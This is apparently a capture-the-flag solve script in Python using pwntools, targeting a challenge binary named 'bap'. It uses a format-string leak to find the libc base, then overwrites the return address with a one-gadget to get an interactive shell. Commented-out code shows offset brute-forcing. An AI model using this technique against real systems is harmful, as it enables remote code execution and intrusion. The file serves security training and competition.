from pwn import *

context.binary = file = ELF("./bap")
context.terminal = ["kitty"]
gdbscript = """
# b printf
# b *printf+0xc6
c
"""

delim = b": "

def connect():
    if args.REMOTE:
        p = remote("challs.actf.co", "31323")
    else:
        p = gdb.debug("./patched", gdbscript=gdbscript)
    return p

idx = 16

# payload = b""
# payload += f"%{idx}$p".encode()
# p.sendlineafter(delim, payload)

# offset = 24
# while True:
#     p = connect()
#     log.info(f"offset = {offset}")
#     try:
#         payload = b""
#         payload += f"%{idx}$s".encode()
#         payload += f"%{offset}$p".encode()
#         p.sendlineafter(delim, payload)
#         leak = u64(p.recv(6).ljust(8, b"\x00"))
#         other = int(p.recv().strip(), 0)
#         if other == leak:
#             log.info(f"FOUND: offset = {offset}")
#             break
#         else:
#             log.info(f"{leak  = :#x}")
#             log.info(f"{other = :#x}")
#     except (EOFError, ValueError):
#         pass
#     offset += 1
#     p.close()
# 13 is pointer to pointer to /app/run
# 43 is pointer to /app/run

p = connect()
# if args.REMOTE:
#     ptr = 45
#     guess = 0xf21
# else:
#     ptr = 43
#     guess = 0

# retaddr = (guess << 4) | 8

# payload = b""
# payload += f"%{retaddr - (idx - 2)}c".encode()
# payload += b"%c" * (idx - 2)
# payload += f"%hn".encode()
# payload += f"%{256 - (retaddr & 0xff) + 0x7b}c".encode()
# payload += f"%{ptr}$hhn|STOP|".encode()
# p.sendlineafter(delim, payload)
# p.recvuntil(b"|STOP|")

# payload = b""
# payload += b"%c" * 7
# payload += b"%*c"
# payload += f"%{0xfed0-7}c".encode()
# payload += b"%c" * 14
# payload += b"|"
# log.info(f"{len(payload) = :#x}")
# p.sendlineafter(delim, payload)
# p.recvuntil(b"|")

payload = b"%29$p."
payload = payload.ljust(0x18, b"\x00")
payload += p64(file.sym.main+5)
p.sendlineafter(delim, payload)

# __libc_start_main_impl+0x80

leak = int(p.recvuntil(b".", drop=True), 0)
log.info(f"{leak = :#x}")

libc = ELF("./libc.so.6")
libcbase = leak - libc.sym.__libc_start_main_impl - 0x80
log.info(f"{libcbase = :#x}")

payload = b"\x00" * 0x10
payload += p64(file.bss(0x800))
payload += p64(libcbase + 0xebcf1)
p.sendlineafter(delim, payload)

p.interactive()
